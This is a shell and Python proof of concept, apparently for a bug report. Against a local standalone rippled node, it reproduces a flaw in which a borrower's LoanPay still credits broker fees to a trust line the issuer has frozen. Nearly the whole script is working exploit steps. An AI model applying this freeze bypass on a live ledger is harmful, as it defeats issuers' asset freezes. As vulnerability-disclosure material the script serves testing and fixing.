# LoanPay Freeze Bypass – Stand-alone Node PoC

This script reproduces the issue where a frozen broker trust line still receives fees.  
All interactions use JSON-RPC against a local standalone `rippled`

```bash
###############################################################################
# 1. Start standalone rippled
###############################################################################
./rippled -a --start --conf rippled.cfg

###############################################################################
# 2. Create deterministic wallets (issuer, broker owner, borrower)
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"issuer freeze poc"}]
}' | tee issuer_wallet.json

curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"broker freeze poc"}]
}' | tee broker_wallet.json

curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"borrower freeze poc"}]
}' | tee borrower_wallet.json

ISSUER_ACCOUNT=$(jq -r '.result.account_id' issuer_wallet.json)
ISSUER_SECRET=$(jq -r '.result.master_seed' issuer_wallet.json)
BROKER_ACCOUNT=$(jq -r '.result.account_id' broker_wallet.json)
BROKER_SECRET=$(jq -r '.result.master_seed' broker_wallet.json)
BORROWER_ACCOUNT=$(jq -r '.result.account_id' borrower_wallet.json)
BORROWER_SECRET=$(jq -r '.result.master_seed' borrower_wallet.json)

###############################################################################
# 3. Fund accounts from genesis master
###############################################################################
for acct in "$ISSUER_ACCOUNT" "$BROKER_ACCOUNT" "$BORROWER_ACCOUNT"; do
  curl -s -X POST http://127.0.0.1:5005 -d "{
    \"method\":\"submit\",
    \"params\":[{
      \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",
      \"tx_json\":{
        \"TransactionType\":\"Payment\",
        \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",
        \"Destination\":\"$acct\",
        \"Amount\":\"100000000000\"
      }
    }]
  }" | jq '.result.engine_result'
done

###############################################################################
# 4. Set trustlines and issue IOU liquidity
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"TrustSet\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"LimitAmount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"1000000000\"
      },
      \"Flags\":262144
    }
  }]
}" | jq '.result.engine_result'

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BORROWER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"TrustSet\",
      \"Account\":\"$BORROWER_ACCOUNT\",
      \"LimitAmount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"1000000000\"
      },
      \"Flags\":262144
    }
  }]
}" | jq '.result.engine_result'

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$ISSUER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"Payment\",
      \"Account\":\"$ISSUER_ACCOUNT\",
      \"Destination\":\"$BROKER_ACCOUNT\",
      \"Amount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"1000000\"
      },
      \"Flags\":131072
    }
  }]
}" | jq '.result.engine_result'

###############################################################################
# 5. Create vault (scale 6) and LoanBroker, deposit cover
###############################################################################
VAULT_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"VaultCreate\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"Asset\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\"
      },
      \"Scale\":6
    }
  }]
}" | jq -r '.result.tx_json.hash')

VAULT_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"tx\",
  \"params\":[{\"transaction\":\"$VAULT_HASH\"}]
}" | jq -r '.result.meta.AffectedNodes[]
    | select(.CreatedNode? and .CreatedNode.LedgerEntryType==\"Vault\")
    .CreatedNode.LedgerIndex')

BROKER_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"LoanBrokerSet\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"VaultID\":\"$VAULT_ID\",
      \"CoverRateMinimum\":1
    }
  }]
}" | jq -r '.result.tx_json.hash')

LOANBROKER_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"tx\",
  \"params\":[{\"transaction\":\"$BROKER_HASH\"}]
}" | jq -r '.result.meta.AffectedNodes[]
    | select(.CreatedNode? and .CreatedNode.LedgerEntryType==\"LoanBroker\")
    .CreatedNode.LedgerIndex')

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"LoanBrokerCoverDeposit\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"LoanBrokerID\":\"$LOANBROKER_ID\",
      \"Amount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"100000\"
      }
    }
  }]
}" | jq '.result.engine_result'

###############################################################################
# 6. Create a loan (broker submits with borrower counter-signature)
###############################################################################
cat > loan_template.json <<EOF
{
  "TransactionType": "LoanSet",
  "Account": "$BROKER_ACCOUNT",
  "LoanBrokerID": "$LOANBROKER_ID",
  "Counterparty": "$BORROWER_ACCOUNT",
  "PrincipalRequested": {
    "currency": "USD",
    "issuer": "$ISSUER_ACCOUNT",
    "value": "100000"
  },
  "PaymentInterval": 2419200,
  "PaymentTotal": 12,
  "Fee": "12",
  "SigningPubKey": ""
}
EOF

# Borrower signs as CounterpartySignature
tmp=$(rippled --conf rippled.cfg sign "$BORROWER_SECRET" "$(cat loan_template.json)" offline CounterpartySignature)
COUNTER_SIG=$(echo "$tmp" | jq -r '.result.tx_json.CounterpartySignature')

echo "$COUNTER_SIG" | jq '.' > counterparty_signature.json

# Broker finalizes and signs
BROKER_SEQ=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_info\",
  \"params\":[{\"account\":\"$BROKER_ACCOUNT\"}]
}" | jq -r '.result.account_data.Sequence')

cat loan_template.json | jq ".CounterpartySignature = $(cat counterparty_signature.json) | .Sequence = $BROKER_SEQ" > loan_with_counter.json

SIGNED_LOAN=$(rippled --conf rippled.cfg sign "$BROKER_SECRET" "$(cat loan_with_counter.json)" offline true |
  jq -r '.result.tx_blob')

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{\"tx_blob\":\"$SIGNED_LOAN\"}]
}" | tee loan_submit_response.json | jq '.result.engine_result'

LOAN_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"tx\",
  \"params\":[{\"transaction\":\"$(jq -r '.result.tx_json.hash' loan_submit_response.json)\"}]
}" |   jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Loan") .CreatedNode.LedgerIndex')

echo "Loan ID: $LOAN_ID"

###############################################################################
# 7. Record baseline balances
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_lines\",
  \"params\":[{
    \"account\":\"$BROKER_ACCOUNT\",
    \"peer\":\"$ISSUER_ACCOUNT\"
  }]
}" | tee broker_lines_before.json

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"ledger_entry\",
  \"params\":[{
    \"index\":\"$LOANBROKER_ID\"
  }]
}" | tee loanbroker_before.json

###############################################################################
# 8. Freeze issuer -> broker trust line
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$ISSUER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"TrustSet\",
      \"Account\":\"$ISSUER_ACCOUNT\",
      \"LimitAmount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$BROKER_ACCOUNT\",
        \"value\":\"0\"
      },
      \"Flags\":2147483648
    }
  }]
}" | jq '.result.engine_result'

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_lines\",
  \"params\":[{
    \"account\":\"$ISSUER_ACCOUNT\",
    \"peer\":\"$BROKER_ACCOUNT\"
  }]
}" | jq '.result.lines'

###############################################################################
# 9. Submit borrower LoanPay while frozen
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BORROWER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"LoanPay\",
      \"Account\":\"$BORROWER_ACCOUNT\",
      \"LoanID\":\"$LOAN_ID\",
      \"Amount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"1000\"
      }
    }
  }]
}" | jq '.result.engine_result'

###############################################################################
# 10. Observe result: broker still receives fee
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_lines\",
  \"params\":[{
    \"account\":\"$BROKER_ACCOUNT\",
    \"peer\":\"$ISSUER_ACCOUNT\"
  }]
}" | tee broker_lines_after.json

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"ledger_entry\",
  \"params\":[{
    \"index\":\"$LOANBROKER_ID\"
  }]
}" | tee loanbroker_after.json

python3 - <<'PY'
import json, decimal
before = json.load(open("broker_lines_before.json"))['result']['lines'][0]
after = json.load(open("broker_lines_after.json"))['result']['lines'][0]
bal_before = decimal.Decimal(before['balance'])
bal_after = decimal.Decimal(after['balance'])
fee_delta = bal_after - bal_before
print(f"Broker owner balance delta: {fee_delta}")

before_cover = decimal.Decimal(json.load(open("loanbroker_before.json"))['result']['node']['CoverAvailable']['value'])
after_cover = decimal.Decimal(json.load(open("loanbroker_after.json"))['result']['node']['CoverAvailable']['value'])
print(f"CoverAvailable before: {before_cover}")
print(f"CoverAvailable after : {after_cover}")
PY
```

**Expected output**

- `LoanPay` returns `tesSUCCESS`.
- `account_lines` delta shows the broker owner’s IOU balance increases by the fee even though the trust line is frozen.
- `CoverAvailable` remains unchanged (fees were not redirected to cover), proving the freeze bypass.
